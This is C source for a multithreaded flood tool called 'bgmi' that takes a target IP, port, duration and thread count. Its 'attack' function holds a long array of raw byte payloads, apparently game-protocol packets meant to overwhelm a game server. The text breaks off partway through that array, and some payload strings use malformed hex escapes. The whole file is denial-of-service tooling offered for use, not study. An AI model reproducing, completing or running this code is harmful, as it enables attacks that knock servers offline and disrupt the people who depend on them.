#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./bgmi ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "\xd9\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x87\x60\x12\x2A\xE4\x06\x78\x6A\x8A\xA8\xAD\x12\x3C\x72\x3B\xE5\xC8\x5A\x09\x52\x8C\x2F\x76\xCB\xF6\x47\xD9\xFD\xCB\x67\x7E\x88\x4C\x91\x58\xC0\x2B\xC7",
        "\x87\x60\x12\x2A\xFC\x06\x60\x6A\x6A\x61\x25\x22\x5A\xE9\x26\x2C\xAF\xF2\x8E\xB2\x35\x84\xBE\xFA\x5A\xE4\x2F\x8F\xAA\xE9\xC9\x12\x4A\x43\x97\x44\xA5\x64\xE4\xDC\x87\x0D\x78\x5A\xF4\x9F\xED\xCF\x73\x81\xC0\x7B\xF0\x83\xD8\x26\xE8\x11\xCE\x1E\x3A\x39\x00\x94\x6F\x4B\xCD\xFD\xBC\x74\xF2\x96\x3F\x01\x12\x41\x3C\x50\x3D\xEE\x03\x3E\xCF\xD6\x2C\xF0",
        "\x87\x60\x12\x2A\xF0\x06\x78\x6A\x8A\xAF\x2D\x12\x3C\x72\x38\xE5\xCB\x5A\x89\x53\xA3\x28\x76\xC9\xF6\x4D\x41\xBA\x01\x58\xFD\x9D\x1A\x7B\xB1\x86\x56\xC2\xCB",
        "\x87\x60\x12\x2A\xC8\x06\x78\x6A\x8A\xAC\xAD\x10\x3C\x72\x37\x65\xCA\x5A\xC9\x53\x29\x28\x76\xF3\xF6\x4B\xB9\x64\x69\x05\x56\xBB\x07\xA0\x42\xEA\x42\xBB\x0F\xB0\xE9\xE5",
        "\x87\x60\x12\x2A\xC4\x06\x60\x6A\x4A\x61\x75\x07\x36\x64\x1B\x1D\xF9\xDA\x89\xB2\x79\xB7\x5D\xFA\x44\x5F\xA3\x7A\x43\x67\x25\x87\xA1\xF8\xB8\x81\xF3\xC3\xB6\xD2\xEB\xEE\xFB\x3A\x0E\x40\x62\xA3\x9E\x38\x24\xE5\x85\x50\x50\xE0\xEF\xE5\x4D\x65\x50\x57\x5C\x00\xFA\xA6",
        "\x87\x60\x12\x2A\xC0\x06\x60\x6A\xAA\x60\x25\x22\x5A\xE9\x26\x2C\xAF\xF2\x8E\xB2\x35\x84\xBE\xFA\x5A\xE4\x2F\x8F\xAA\xE9\xC9\x12\x4A\x43\x97\x44\xA5\x64\xE4\xDC\x87\x0D\x78\x5A\xF4\x9F\xED\xCF\x73\x81\xC0\x7B\xF0\x83\xD8\x26\xE8\x11\xCE\x1E\x3A\x39\x00\x94\x6F\x4B\xCD\xFD\xBC\x74\xF2\x96\x3F\x01\x32\x41\x3C\x50\x3D\xEE\x03\x1E\x89\xD6\x2C\x70\xC2\xBB\xF3\x24",
        "\x87\x60\x12\x2A\xDC\x06\x78\x6A\x8A\x91\x2D\x11\x3C\x72\x32\xE5\xCA\x5A\x89\xD3\x96\x28\x76\xF5\xF6\x4D\x61\x08\xBF\x63\x9E\x3D\xE0\x16\xAC\xD4\x10\x80\x95\x93\x9E\x3C\x22\xF1\xDC",
        "\x87\x60\x12\x2A\xD0\x06\x78\x6A\x8A\x90\xAD\x26\x3C\x72\x33\x25\xC5\x5A\x99\x53\xB5\x28\x76\xFB\xF6\x4F\x41\x8E\xB9\x6C\x9E\x4E\xE0\x16\xFE\xCD\x8F\xCB\x0F\xF2\xA8\xCD\x97\xCD\xDC\x14",
        "\x87\x60\x12\x2A\x24\x07\x78\x6A\x8A\x91\x2D\x11\x3C\x72\x32\x65\xC5\x5A\xC9\xD3\x9A\x2F\x76\xF5\xF6\x43\x51\xBE\x7A\x05\x92\xEE\x73\x3D\xF1\xD5\x10\x80\x95\xD5\x50\x49\xC3\xEA\xDC",
        "\x87\x60\x12\x2A\x20\x07\xC1\xE8\xCF\xB2\xCD\x06\xFC\xCF\x45\x10\x4D\x94\x80\x9E\x3F\x6C\x4F\xCA\xD9\x1A\x88\x2D\xC3\xE7\x4B\x68\x76\x56\xCB\x51\x0C\x51\xE8\x54\xAE\xB9\xAD\xF3",
        "\x87\x60\x12\x2A\x3C\x07\xC1\xE8\xCF\xF2\x62\x06\xB9\xC8\x76\x8F\xB7\x7E\x11\xA1\xB1\xBC\x34\x82\xD7\x47\xC3\x26\x43\x60\x25\x97\x63\x8E\xB9\x29\x48\xC1\xCD\xD0\xE9\xE3\x3D\xF2\xDA\x12\x60\xE3\xBE\x6C\xAC\x95\x35\x6B\x75\x68\x46\x38\xC2\x70\xD4\x72\xA8\xBA\xE2\xC6\xE1\x30\x51\x98\xF9\xFD\xD9\x2A\x19\xA7\x77\xB6\xFB\xA8\x05\x1E\x12\x6B\x15\xE9\x05\xD7",
        "\x87\x60\x12\x2A\x38\x07\x60\x6A\xEA\x60\x25\x19\xDA\xD3\x26\x2C\xD8\x32\x8F\xB2\x35\x84\xBE\xFA\x5A\xE4\x2F\x8F\xAA\xE9\xC9\x12\x4A\x43\x97\x44\xA5\x64\xE4\xDC\x87\x0D\xD8\xBB\x96\xBF\x0C\x6F\x50\xA9\x44\x38\x7B\xC5\x5C\x64\x28\xD6\xC9\x5F\x32\x59\x87\x5C\x09\x8F\xAD\x9D\x3D\x14\xF7\xFD\xD9\x2A\x19\xC7\xD4\xD6",
        "\x87\x60\x12\x2A\x34\x07\x78\x6A\x8A\xAD\x2D\x13\x3C\x72\x36\xE5\xC5\x5A\x09\x52\x98\x28\x76\xCD\xF6\x47\x21\x0B\xF9\x67\x5E\xC8\xD4\x4B\xA6\x9B\x4E\x30\x19\x51\xEF",
        "\x87\x60\x12\x2A\x08\x07\xDB\xE8\xC0\xB2\xCD\x06\xBC\xC0\xA5\x10\x4D\xD4\x83\xEE\x3F\x6C\x6B\x6A\x19\x1B\x08\x22\x43\xE5\xEB\xD3\x11\x4F\x57\x93\xB7\xDC\xBF\xEF\xC5\xF1\x59\x83\x9A\x92\x61",
        "\x87\x60\x12\x2A\x00\x07\x78\x6A\x8A\xAC\xAD\x10\x3C\x72\x37\xA5\xC4\x5A\x59\xD2\x06\x29\x76\xF3\xF6\x41\x81\x0F\x96\x04\x16\x5A\x9C\xF4\x4E\xEA\x6A\x80\x1B\xDD\xED\xE5",
        "\x87\x60\x12\x2A\x18\x07\x78\x6A\x6A\xA4\x61\x5D\xAE\xA8\x97\x55\xF4\x64\xF4\x91\xF1\x30\xF1\xBB\x05\xB2\xAE\x91\x61\x08\x45\x0A\x8E\x8A\x2E\xAB\x04\xC0\xC1\xD0\xA9\xE4\x66\xF7\x7A\xFC\x69\x9F\xB4\x64\x8C\x8D\x7E\x38\x3E\x6F\xC6\xBA\x26\x95\xC4\xB3\xCE\x18\x1D\x85\xDF\xF4\xDB\x9B\x78\xFC",
        "\x87\x60\x12\x2A\x6C\x07\x68\x6A\x6A\xB9\x29\x15\x6C\x13\x32\xEB\x2C\x1C\xD9\x41\x3D\xFF\xD9\xD3",
        "\x87\x60\x12\x2A\x44\x07\x78\x6A\x8A\xAD\x2D\x13\x3C\x72\x36\x65\xC6\x5A\x09\xD2\x8A\x28\x76\xCD\xF6\x4B\x01\x9B\x19\x04\x92\x29\x1C\x2B\xFA\xB7\xB7\x6B\xC8\xD2\xA3\xE6\x3E",
        "\x87\x60\x12\x2A\x40\x07\xEF\xE8\xDE\xB2\xCB\x06\x54\xFC\x73\x95\xCF\x11\x88\xE4\x30\xC9\xD9\x85\xF7\x45\xC3\xEA\x44\xFF\x20\x37\x0D\x84\x55\x23\x40\xE5\x15\xBB\xBA\xA8\x35\x72\x5A\xB6\xBE\xC5\x66\xA1\x42\x0A\x71\xE3\x84\x94\x11\x0A\xDA\xF0\xD5",
        "\x87\x60\x12\x2A\x5C\x07\x60\x6A\x4A\x60\x25\x19\xDA\xD3\x26\x2C\xD8\x32\x8F\xB2\x35\x84\xBE\xFA\x5A\xE4\x2F\x8F\xAA\xE9\xC9\x12\x4A\x43\x97\x44\xA5\x64\xE4\xDC\x87\x0D\xD8\xBB\x96\xBF\x0C\x6F\x50\xA9\x44\x38\x7B\xC5\x5C\x64\x28\xD6\xC9\x5F\x32\x59\xE7\x5C\x09\x8F\xAD\x9D\x3D\x14\xF7\xFD\xD9\x2A\x19\x47\xDE\x96\xAE\x18\x2F\x76\x47\x6A\x26\x16",
        "\x87\x60\x12\x2A\x8C\x07\xF3\x68\x92\xB3\x31\x0D\x6C\xE5\x17\xA5\xA9\xDA\xF9\x3D\x67\x71\x39\xF8\x23\xFD\x3A\xD7\xF5\x39\x34\xA1\xD3\x40\xCF\xAB\x16\xC0\xC1\xD0\xE9\xE4\x06\xF7\x7A\xBC\x69\xBF\xB5\x64\x98\x8D\x39\x38\xBE\x6E\xC6\xBB\xE0\x44\x10\xB2\xFE\x63\x98\x83\x7D\xC7\x5C\x1E\xF8",
        "\x87\x60\x12\x2A\x84\x07\x68\x6A\x6A\xB9\x29\x15\x6C\x13\xF2\x80\x2F\x12\xD9\x01\x3F\xDB\x59\xCA\xF6\x49\xCD\x5C\x49\x24\x78\x84\xBB\x98\xA9\x61\x78\xD2\x6B\x46\xE4\xE3\x3F\x43\x8D\x37\xD0\x66\x22\x79\xBE\x11\xC2\xE5\x74\x6B",
        "\x87\x60\x12\x2A\x9C\x07\x60\x6A\x6A\x60\x05\x46\xDA\xD3\x26\x2C\xD8\x32\x8F\xB2\x35\x84\xBE\xFA\x5A\xE4\x2F\x8F\xAA\xE9\xC9\x12\x4A\x43\x97\x44\xA5\x64\xE4\xDC\x87\x0D\xD8\xBB\x96\xBF\x0C\x6F\x50\xA9\x44\x38\x7B\xC5\x5C\x64\x28\xD6\xC9\x3F\x32\x59\xE7\x5C\x09\x8F\xAD\x9D\x3D\x14\xF7\xFD\xD9\x2A\x19\x07\x8E\xB0\xB5\x26\x08\xBC\x53\xD6\x2C\x68\x5B\xD1\xC8\x3F\xA8\x6F\x93\xB7\x03\x74\x68\x6C\xD4\x77\x52\x3C\x12\x11\xFC\xA6\xA7\x8E\x7E\xEC\x5B\x16\x09\x13\x14\x1A\x93\xC2\x30\xD7\xAA\x3D\x4C\xD0\x9E\x6E\xF0\xB4\x82\xA8\x06\x0F\x59\xF3\xB4\x3B\x73\xDB\x7E\x44\x5E\xA0\xAF\x51\x3B\x5C\x02\x1F\x39\xC0\x79\x99\xA7\x02\xE4\x2D\xF1\xDA\x81\x42",
        "\x87\x60\x12\x2A\x98\x07\x60\x6A\x8A\x67\x55\x24\x5A\xD3\x26\x2C\xDB\xF2\x8F\xB2\x35\x84\xBE\xFA\x5A\xE4\x2F\x8F\xAA\xE9\xC9\x12\x4A\x43\x97\x44\xA5\x64\xE4\xDC\x87\x0D\x78\x18\xB7\x7E\x0D\x0D\x7B\x84\x01\xDB\x9B\x42\x79\x06\xA8\x73\x28\x1D\xB8\x9F\xA3\xB1\x04\xED\xCA\xD6\x7A\xDE\xBF\x9B\xDF\x8A\xFC\xA7\x77\x16\xD9\xC3\x04\x9C\x57\x15\xAE\x72\xA3",
        "\x87\x60\x12\x2A\xE8\x07\x60\x6A\xEA\x67\x25\x26\x5A\xD3\x26\x2C\xDB\xF2\x8F\xB2\x35\x84\xBE\xFA\x5A\xE4\x2F\x8F\xAA\xE9\xC9\x12\x4A\x43\x97\x44\xA5\x64\xE4\xDC\x87\x0D\x78\x18\xB7\x7E\x0D\x0D\x7B\x84\x01\xDB\x9B\x42\x79\x06\xA8\x73\x28\x1D\xB8\x9F\xA3\x91\x04\xED\xEA\xD6\x7A\x7E\x1F\xFB\xDF\xAA\xBC\xA7\x77\x96\xF7\xA8\x45\x19\x09\xD3\x8C\xFE\x6B\x47\xA8\x1C\x93\xBE\x8A\xC7\x33\x12\x22\x5F\xA7\xB8\x0A\x8D\xC4\x02\x47\x8B\x23\x30\x26\xA5\x48\x6C",
        "\xDB\x25\x5F\xEC\x2C\x11\x1C\x68\x50\x4B\x65\xCE\x19\x64\x6F\xC3\xA5\x11\x25\x87\xEF\x7E\x6B\xD2\x56\x4C\xF7\xF8\x0A\x36\x37\x56",
        "\xD3\x25\x08\x61\x94\xDA\x14\x69\x8C\xB3\x01\x87\xFA\xF2\x57\x5F\xCE\x22\x07\x42\xF4\x5B\x6A\x0F\xC9\x89",
        "\xD7\x25\x81\xFC\xFC\x32\x00\x03\xEF\xB3\xC1\x06\xDC\x5F\xFE\x75\x7E\xBA\xE9\xBE\x35\x64\x9B\x3A\x5B\x07\x6D\x03\x4F\x0A\xCB\xDC\xCB\xA0\x34\xA4\x64\x0C\x20\x3C\xE2\xA8\xDB\xD9\xF1\xF4\x2B\xA5\x58\xAA\x4A\xBE\xD3\xCD\x53\x8E\x0D\x90\xEC\xFD\x59\x5E\x65\x57\xEE\x21\x07\x1B\x77\xBE\xFF\x3B\x3F\x41\x11\x8A\xFA\x3B\xD7\xC0\x89\xF0\x1F\x38\x67\x18\x88\x50\x4B\xF9\x9E\x08\xCF\x72\x93\xFF\xCF\x52\x73\xE7\xC1\xF8\x56\x3C\x4E\xD1\x58\x1A\x0E\x5F\xAB\x65\x15\xE4\x32\xA5\x90\x44\x5D\x01\x5F\x6F\x69\x6E\xF1\x69\xA5\xD6\x1B\xF1\x44\xD6\xD1\x62\x25\xE2\xDA\x95\xDA\xC9\x72\x75\x6E\x45\xCA\x7A\x29\x39\x73\x76\xEE\x9F\xED\xA0\xDD\xD9\x1C\x42\xE2\x87\x6A\x23\x3D\xA9\xFF\x05\x36\x63\xAA\x65\x76\x78\x86\xB6\x99\x97\x8E\xA9\x8F\x76\x96\xE0\x74\x3D\x37\xD2\x24\x8E\x1E\xE7\x11\x79\x52\x26\xE7\xAD\x45\xE8\x7B\x18\xF9\xAF\xB4\x30\xF6\x66\x26\xE9\xBD",
        "\xCB\x25\xC1\xFC\xFC\x32\x00\xFB\xE3\xB3\xC1\x06\x5C\x5D\xFE\x75\x7E\x9A\x69\x21\xD5\x04\xCF\x32\xF6\x69\xCB\x2A\x43\x84\xC0\xBF\xCF\x23\x55\x8C\xA1\x4C\x21\x55\xC0\x2E\x13\x9F\x37\xB7\x49\xEF\xD0\x82\xE9\x3D\x1B\xE6\xF8\x44\x8B\xD5\xAE\x9E\x11\x9A\x05\xF4\x4C\xEF\xED\x5E\xBF\xD3\x51\xD3\x54\xA7\x35\x6A\x9A\x5A\xF0\xE3\xE3\x35\x79\x30\x67\x56\x84\x1D\x45\x3F\x35\xA0\xCF\x92\x78\x15\x22\xDF\xDF\x28\x29\x55\xD8\x7A\xCA\x93\x98\xDD\x69\xD9\x2E\x26\x90\x47\x32\x04\xD4\x05\x5E\xA0\x5A\xE4\xD0\xE0\xEE\x73\x79\x70\x9D\xA4\x62\xDD\x35\xC4\x03\xA4\x72\xBB\x57\x44\x5E\xBA\x83\x49\x2D\x36\x4E\x71\x7B\x1D\xA6\x37\x81\x19\xAA\x33\xBD\x74\x8E\x6A\xFD\xE3\x5D\xA8\x5F\x0F\x56\x6B\x47\x00\x56\x1A\x40\x13\x7B\xB4\x6E\xC2\x09\xE3\x65\x6B\xDF\xF0\xA0\xBF\x6D\x41\xA5\x4E\x83\xA6\xE5\x72\x0D\x78\xA7\xC3\xC9\xFD\x91\x07\xF1\x38\x9C\x15\x08\x18\x90\xBC\x8F\x46\xFD\x7C\x2F\x32\xFE\x06\xD9\x33\x96\x84\x57\xE1\xCB\x1A\xA7\x9A\xA2\xBE\x86\x09\x8C\xBA\xAE\xC3\x63\x73\x5F\x87\xCE\x6D\x52\x14\xAB\x0C\x72\x29\xBD\x0E\x72\x94\x35\x59\x97\x6E\x2E\x27\x70\xD0\x7C\x83\x32\x91\x4F\xD1\x21\x5C\x2C\x52\x5E\x86\x62\x22\x8A\x5E\xCF\x80\x53\x06\x31\xDC\xE8\xB8\xF8\xA7\xB0\x10\xA6\xD2\xCC\x5A\x68\x92\x81\xB4\xEF\xE8\xBC\x9C\xEC\x61\x38\xBD\xE6\xD6\x95\xFD\xA8\x8F\x8A\xE7\xD7\x4D\x7B\xF4\x66\x1A\x16\x89\x77\x2A\xE6\x88\x6A\x7A\x73\xA5\x50\xA4\x48\x99\x37\x59\xED\xB8\xB5\x66\xE3\xC2\x17\xE2\x0B\x64\xB4\x6C\x95\x54\xF5\x35\x55\xB6\xE0\x86\x30\x5B\xDB\x9B\xA2\x97\x5D\xA6\xFB\xCD\x88",
        "\x0C3\x025\x057\x0EC\x04C\x014\x0DE\x049\x056\x0A5\x081\x07A\x067\x0C7\x01E\x001\x0ED\x032\x0E9\x0A8\x0B3\x0CC\x05B\x092\x0FE\x021\x02A\x06B\x043\x064\x025\x0F7\x0F5\x06E\x0D9\x0BA\x088\x041\x0CF\x0D0\x0E9\x0A3\x035\x018\x011\x0FA\x0CD\x0AD\x010\x045\x0A0\x07B\x0BE\x061\x0D8\x024\x0E8\x015\x02E\x09B\x0D2\x0D2\x0FF\x077\x085\x021\x077\x0D0\x031\x00E\x039\x0DD\x0D8\x02A\x019\x0E7\x0DF\x078\x037\x084\x04D\x0B0\x07E\x0DA\x00C\x03E\x0D9\x0A5\x0A5\x090\x0D3\x08C\x0EE\x0E7\x00B\x08D\x007\x067\x0BA\x024\x029\x0FD\x09E\x00E\x0FB\x0C1\x036\x0F4\x043\x0A6\x010\x043\x070\x020\x0DA\x089\x0F8\x0C8\x053\x0D4\x0B1\x0CF\x0A5\x00B\x0E5\x099\x032\x036\x0BB\x08A\x029\x0B8\x07D\x04B\x029\x0CC\x09C\x0F0\x0FF\x06A\x0D3\x035\x0AF\x084\x0C0\x070\x009\x054\x0B3\x05B\x003\x07F\x006\x0D2\x0C2\x05C\x097\x0F1\x0E4\x0C1\x0DB\x005\x016\x000\x0D1\x088\x0DB\x047\x04A\x005\x0F7\x072\x048\x0DC\x07C\x0FC\x066\x0C2\x027\x0EB\x08E\x000\x078\x0D1\x0A0\x01E\x028\x0EC\x008\x06D\x042\x0CB\x046\x0D9\x0A6\x0B0\x0C7\x00E\x004\x012\x059\x02C\x057\x0FB\x09E\x073\x0AE\x01B\x0F7\x01E\x0C8\x0A4\x078\x01F\x04E\x097\x09F\x025\x079\x0F3\x015\x0EE\x0F2\x004\x00B\x016\x0D4\x077\x038\x0EE\x0F3\x0A2\x044\x0E7\x0A2\x06F\x029\x0DD\x073\x02B\x00D\x0AB\x0B4\x091\x0AA\x04C\x012\x009\x0F3\x024\x07A\x0D2\x01D\x05F\x006\x07F\x05A\x034\x0E0\x090\x028\x0E9\x0B1\x0FC\x0D4\x031\x041\x085\x0E4\x078\x095\x06E\x0CF\x0EC\x0C8\x09A\x08E\x020\x0DE\x02C\x0B2\x02B\x038\x093\x09D\x04C\x0CC\x031\x0B3\x09B\x0C8\x03F\x047\x04B\x0CD\x031\x013\x0DB\x0B9\x09C\x0B8\x062\x0DE\x03D\x024\x0FA\x05D\x0E8\x0C2\x0DD\x0C9\x066\x0BD\x0E4\x065",
        "\x0C7\x025\x018\x061\x0EC\x0DA\x028\x069\x08C\x0B3\x075\x086\x0FA\x0F2\x057\x09F\x0C9\x04A\x002\x032\x043\x025\x011\x087\x0F5\x049\x0C3\x02A\x090\x060\x022\x040\x067\x089\x062\x02D\x04F\x01E\x0C9\x0D7\x0E9\x0A2\x03D\x0F2\x0DA\x03D\x027\x082\x0D3\x009\x083\x0D8\x05A\x00F\x05A\x024\x02F\x04E\x0AB\x01B\x0FB\x03F\x0C9\x0CA\x091\x0E9\x0A3\x045\x038\x0F4\x09D\x094\x0B7\x04D\x06A\x088\x031\x0D9\x08E\x0DA\x0B7\x031\x041\x085\x0E4\x078\x095\x06E\x0CF\x0EC\x0C8\x09A\x08E\x020\x0DE\x02C\x0B2\x02B\x038\x093\x09D\x04C\x0CC\x031\x0B3\x09B\x0C8\x03F\x047\x04B\x0CD\x031\x013\x0DB\x0B9\x09C\x0B8\x062\x0DE\x03D\x024\x0FA\x05D\x0E8\x0C2\x0DD\x0C9\x066\x0BD\x0E4\x065",
        "\x0FB\x025\x0C1\x0FD\x0FC\x032\x000\x013\x0EF\x0B3\x0C1\x006\x0DC\x055\x0FE\x075\x07E\x0BA\x009\x0BE\x035\x064\x09B\x03A\x05B\x007\x06D\x003\x04F\x00A\x0CB\x0DC\x0CB\x0A0\x034\x0A4\x064\x00C\x020\x03C\x0E2\x0A8\x0DB\x0D9\x0F1\x0F4\x02B\x0A5\x058\x0AA\x04A\x0BE\x0D3\x0CD\x053\x08E\x00D\x090\x0EC\x0FD\x059\x05E\x065\x057\x0CE\x080\x0E7\x0D6\x01A\x0BE\x0FF\x0DB\x03F\x0CC\x072\x0AF\x05A\x03B\x076\x084\x06D\x092\x0BC\x09B\x0C2\x05B\x06A\x031\x028\x0FC\x03E\x04B\x0E7\x0B2\x09E\x0FE\x0C8\x032\x012\x0C0\x0E2\x0BD\x0B5\x0DC\x0C9\x0F4\x03A\x09A\x08B\x0DC\x028\x006\x030\x044\x032\x004\x0D4\x0A0\x03F\x0A2\x01C\x0A1\x0F6\x094\x060\x0A1\x0CE\x0AB\x09B\x002\x017\x036\x093\x060\x025\x0A2\x032\x013\x079\x0C9\x0D3\x094\x04E\x0A4\x001\x0DA\x004\x0F9\x01E\x056\x02E\x0BF\x0AB\x092\x084\x0AE\x088\x099\x06F\x0F9\x01D\x003\x0C0\x068\x09F\x004\x056\x06B\x0E7\x0E0\x0D6\x0D9\x063\x016\x01F\x056\x06E\x0C4\x0AF\x0ED\x0C6\x05D\x08D\x03B\x0C0\x053\x01C\x08B\x001\x0E1\x0DD\x0C2\x017\x00D\x057\x0AD\x08D\x0FB\x02B\x05B\x0E3\x0A2\x0F4\x07E\x078\x0DE\x060\x00A\x098\x072\x0C5\x0FA\x022",
        "\xFF\x25\xE2\x61\xEF\x1A\x44\x6A\x0A\xB0\x4C\x72\x2E\xBC\x54\xA5\xF1\x9B\x34\xB2\xD7\x3B\x25\x52\xF7",
        "\xF7\x25\x5F\xEC\x6C\x11\x1C\x68\x50\x4B\x65\xCE\x94\x79\xAF\xCD\x85\x16\xB5\x84\xC5\x64\x5B\xCB\x7E\x4A\xE7\xA3\x66\x74\x23\x97\xA3\x0F\xFF\x13\x01\x5B\xE8\x88\x67\xD3\x0E\xF2\xEB\xEB\x5E\xE3\xEE\x6C\x8C\x14\x5C\xD3\x67\x6A\xC6\x3B\xC2\x5B\x64\x62\x6E\x3A\xE3\x46\xE0",
        "\x0EB\x025\x0EA\x061\x0EB\x05A\x02C\x069\x08C\x0B3\x0B1\x007\x0C8\x0B9\x038\x03C\x02E\x039\x0AA\x02F\x011\x061\x048\x04A\x0B1\x009\x078\x00A\x0E6\x0F2\x024\x097\x063\x00E\x0C2\x0AB\x0CB\x08C\x0CF\x053\x0DA\x0E3\x03D\x0F2\x079\x0A5\x05A\x05A\x018\x05C\x014\x02C\x01A\x0CA\x0CF\x05C\x070\x08A\x0F6\x0C7\x067\x05D\x084\x023\x04D\x06A\x079\x01F\x048\x001\x0E2\x066\x076\x0B2\x082\x03D\x0EF\x099\x05A\x012\x031\x028\x0E0\x0E2\x09B\x023\x07A\x042\x03B\x03B\x0CB\x09F\x046\x08C\x0E0\x00D\x038\x047\x030\x00D\x09D\x061\x02E\x020\x0C7\x0EC\x08C\x0C3\x0DC\x098\x0E1\x0C5\x017\x0CB\x008\x0BE\x0C1\x050\x02B\x0E3\x0FA\x018\x001\x079\x0EA\x036\x085\x00C\x0C2\x0C4\x0B4\x04E\x06A\x0CD\x084\x00D\x053\x00F\x063\x072\x0EC\x018\x0B2\x0F3\x01A\x0A5\x002\x060\x0C0\x0A2\x0D8\x0E4\x0CF\x017\x069\x098\x0F2\x0D0\x002\x067\x0FD\x042\x0E7\x09C\x0C9\x0B7\x062\x0DC\x0B4\x0F0\x062\x0CC\x0C1\x022\x0EE\x075\x098\x011\x0B9\x0D7\x0F0\x066\x021\x0D9\x042\x0E6\x019\x088\x0C0\x018\x0AA\x0C3\x0AB\x034\x0EB\x03E\x060\x05C\x01B\x06D\x005\x041\x08B\x08A\x041\x0E7\x060\x00D\x032\x0E8\x0BF\x076\x011\x01F\x020\x095\x0A3\x046\x0FD\x039\x09B\x0D2\x053\x0B9\x04A\x0C6\x08B\x082\x001\x0AB\x053\x07B\x024\x074\x064",
        "\xEF\x25\xF6\x61\xE5\x5A\x2D\x69\x8E\xB3\xD9\x07\xC1\xCA\xB3\x01\x67\x05\x39\xAB\x31\x67\x5B\x32\xB6\x6A\x5E\x0E\x76\x77\x09\xD0\x7B\x85\x39\x71\x27\xDE\xCD\xDC\xE9\x5F\xFE\xB1\xD8\x0A\xE0\xA6\x55\xBF\xFA\xE8\xEA\xDD\xAB\xB0\x06\x98\x38\xF1\xE5\xD2\x68\xE8\xE2\xEC\xF1\x18\x95\xB8\x79\xFD\xB9",
        "\xE3\x25\xF4\x61\xE6\xDA\x2D\x49\x39\xB2\xC2\x06\xE6\x88\x3D\x88\xC9\x27\x9A\x32\x36\xE4\x34\xAA\xBE\x49\xC0\x7F\xCF\x59\x57\xE5\x19\xDB\x76\x3C\x40\x95\x7C\xE1\xE3\xF3\x15\xAA\xDC\x52\xB8\x86\xA6\x6C\xAD\x99",
        "\xE7\x25\xF0\x61\xE0\xDA\x2E\xC9\x39\x42\x18\x86\xBD\xC8\x6E\xB5\x7C\x34\x1B\x50\x3C\xF2\x78\xDE\x1E\x06\x4F\xEE\x4C\x64\x23\x97\xD3\x6F\xFF\x28\x44\x01\x6F\x25\x80\x48\x83\x9D\x91\x64\x0C\xC3\xEE\x9F\x53\x35\xE4\x44\x16\xAF\x05\x20\x05\x6F\xD4\x7C\xA8\x1A\x21\x6B\xE3\x28\xD1\x5D\xDE\x29\x17\xDD\xC9\x71\xB3\x6F\xBB\x08\x0F\x5F\x91\x89\xEA\x9E\xE5\xEB\x4A\x2B\x22\xF0\xEA\x54",
        "\x09B\x025\x087\x0EC\x0AC\x019\x06E\x048\x0E9\x074\x0C2\x0C6\x0F8\x0CA\x0C4\x010\x0C4\x0FD\x081\x0B2\x035\x064\x057\x0CA\x0EA\x025\x0D1\x032\x0C7\x065\x025\x097\x07B\x033\x06C\x0E0\x07D\x044\x00C\x01D\x094\x0EA\x0E8\x057\x06B\x083\x0C5\x05A\x023\x011\x0CD\x05C\x049\x00E\x0B0\x014\x08F\x0F0\x01E\x0A8\x0A8\x0B7\x074\x06E\x026\x0BA\x0E8\x0E5\x0F4\x029\x068\x058\x060\x0B7\x0D8\x063\x0A3\x0CA\x03A\x06C\x079\x0D7\x082\x012\x0E0\x06C\x0F3\x066\x01E\x0DD\x016\x07A\x0E0\x0D5\x005\x004\x09F\x062\x056\x0ED\x0F9\x029\x03D\x05B\x0DA\x064\x04B\x0ED\x0D8\x062\x009\x058\x0BD\x0A8\x072\x0F4\x0F5\x0B5\x0BE\x0ED\x0F4\x01E\x0A7\x0CE\x048\x044\x08F\x0FF\x07A\x09A\x02F\x062\x055\x07D\x03D\x0BE\x05E\x0A8\x04F\x05C\x05E\x0B8\x083\x0D9\x090\x021\x0CB\x0DA\x055\x0B4\x04D\x04E\x082\x0B4\x036\x0DA\x05E\x08A\x08A\x057\x09D\x0D3\x06A\x02F\x09A\x087\x055\x0E8\x087\x068\x091\x09C\x027\x0F3\x076\x0DA\x030\x050\x049\x0A1\x094\x0D0\x0F5",
        "\x9F\x25\xC6\xE1\x30\x1C\xF8\x6C\xA0\xB2\xAC\x7A\xEE\xEC\x2B\xCF\xC5\x17\x49\xB2\x35\x5C\x8B\x9A\xD1\x00\xC0\x2C\x88\x75\x03\x66\x44\xC0\x5A\x2E\x48\xC2\xCD\x2A\x99\x57\x3D\xF4\xBA\xEE\x99\x57\x53\xB3\x1B\x30\x09\x5D\xA5\xA4\x7E\x3A\x38\x36\x57\x2D\xEE\x2E\x65\xB6\x81\x0F\x60\x23\xE2\xFD\xC5\x2A\x19\x21\xCC\xB2\xCB\xA8\x8E\x51\xFA\x4B\xC3\xB1\xCF\x52\x10\x95\x93\xF3\x68\x18\x50\x1A\xC0\x92\x98\xAC\x28",
        "\x097\x025\x0C0\x061\x0F8\x0DA\x022\x069\x08C\x0B3\x001\x087\x0FA\x0F2\x057\x0AF\x0DD\x022\x007\x082\x01B\x05B\x0AA\x0EF\x0C9\x049\x0DB\x02A\x093\x0EF\x086\x09E\x053\x08E\x0DA\x092\x0EF\x0CC\x0C3\x06F\x084\x016\x08C\x073\x09C\x0B3\x072\x0D3\x0FF\x050\x0B6\x068\x007\x0A5\x049\x0EC\x013\x0C5\x04B\x01F\x03B\x0C6\x0A9\x0BA\x0E2\x0B9\x0E1\x030\x051\x098\x0F9\x0FD\x0D9\x02A\x0A1\x08A\x077\x056\x0FB\x0A8\x035\x0C2\x077\x056\x02D\x048\x01E\x099\x04E\x068\x0DC\x06B\x0A4\x008\x075\x011\x088\x0D1\x0FB\x0B0\x050\x045\x01F\x0A8\x067\x045\x07F\x0B4\x0DE\x097\x025\x0F9\x039\x069\x0BF\x009\x0FD\x04B\x030\x001\x056\x00F\x08B\x002\x0EA\x040\x09A\x048\x05C\x059\x069\x09E\x04D\x031\x0E1\x058\x09F\x071\x063\x0FB\x072\x095\x056\x06E\x0B4\x0BF\x013\x06D\x0D9\x05C\x0C4\x084\x062\x072\x0CE\x025\x0E1\x0D2\x09F\x079\x036\x0AC\x044\x015\x0F6\x0DF\x09D\x074\x014\x056\x080\x089\x0D0\x0EE\x058\x00C\x071\x0B3\x009\x06B\x0A7\x0C3